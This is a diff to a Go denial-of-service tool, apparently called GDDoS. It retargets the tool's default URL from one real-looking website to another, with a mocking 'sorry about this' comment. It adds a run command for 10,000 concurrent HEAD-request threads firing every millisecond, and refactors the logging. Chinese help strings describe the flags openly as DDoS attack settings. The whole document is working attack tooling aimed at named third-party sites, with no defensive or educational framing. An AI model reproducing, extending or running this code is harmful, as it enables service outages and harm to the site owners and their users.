@@ -1,5 +1,6 @@
 package main
 
+// go run GDDoS.go -m HEAD -dm 15 -ims 1 -cc 10000
 import (
 	"context"
 	"flag"
@@ -66,10 +67,10 @@ var (
 
 // 主程序
 func main() {
-	defaultTargetUrl := "https://rsm.cool" // 对不住了，您
+	defaultTargetUrl := "https://kzkt.tianyuyun.com" // 对不住了，您
 
-	flag.StringVar(&Method, "m", "GET", "DDoS攻击目标URL请求方式(GET/POST/HEAD/...)")
-	flag.StringVar(&TargetUrl, "u", defaultTargetUrl, "DDoS攻击的目标URL")
+	flag.StringVar(&Method, "m", "GET", "DDoS攻击目标的请求方式(GET/POST/HEAD/...)")
+	flag.StringVar(&TargetUrl, "u", defaultTargetUrl, "DDoS攻击的目标")
 	flag.IntVar(&ConcurrencyCount, "cc", 8000, "并发线程数量")
 	flag.IntVar(&IntervalMillisecond, "ims", 100, "每个线程执行DDoS攻击的频率(ms)")
 	flag.IntVar(&DurationMinute, "dm", 2000, "DDos攻击持续时间(分钟)")
@@ -93,13 +94,13 @@ func main() {
 func DoAttacking(grindex int) {
 	for i := 0; ; i++ {
 		if result, err := DoHttpRequest(); err != nil {
-			fmt.Printf("[Error#%d/%d]\033[1;31;40m (%s) \033[0m \n", grindex, i, err.Error()) // 红色 客户端错误
+			PrintError(grindex, i, err.Error()) // 红色 客户端错误
 		} else {
 			responseStatus := fmt.Sprintf("\033[1;32;40m (%s)", *result)                // 绿色 服务端状态码200
 			if !strings.Contains(*result, "200") && !strings.Contains(*result, "301") { // 状态码不是 200/301
 				responseStatus = fmt.Sprintf("\033[1;35;40m (%s)", *result) // 紫色 服务端状态码400/402/403/404/500/501/502/...
 			}
-			fmt.Printf("[GDDoS#%d/%d]%s \033[0m \n", grindex, i, responseStatus) // 默认
+			Log(grindex, i, responseStatus) // 默认
 		}
 		time.Sleep(time.Duration(IntervalMillisecond) * time.Millisecond)
 	}
@@ -140,3 +141,10 @@ func genIpaddr() string {
 }
 
 // TODO: Add Log
+func Log(grindex int, i int, responseStatus string) {
+	fmt.Printf("[GDDoS#%d/%d]%s \033[0m \n", grindex, i, responseStatus) // 默认 [GDDoS#并发线程数/线程重复数] (Get "https://1.1.1.1": dial tcp 1.1.1.1:443: i/o timeout)
+}
+
+func PrintError(grindex int, i int, responseStatus string) {
+	fmt.Printf("[Error#%d/%d] \033[1;31;40m (%s) \033[0m \n", grindex, i, responseStatus) // 默认
+}
